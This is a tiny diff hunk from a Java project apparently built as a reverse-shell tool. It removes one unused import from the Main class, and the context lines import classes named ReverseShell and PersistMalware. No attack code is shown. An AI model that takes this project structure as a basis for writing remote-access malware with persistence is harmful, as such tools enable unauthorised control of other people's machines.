@@ -6,7 +6,6 @@ import com.mtattab.reverseshell.service.impl.ReverseShell;
 import com.mtattab.reverseshell.service.persistence.PersistMalware;
 import com.mtattab.reverseshell.util.LockMechanismUtil;
 
-import java.net.URISyntaxException;
 
 public class Main {
 
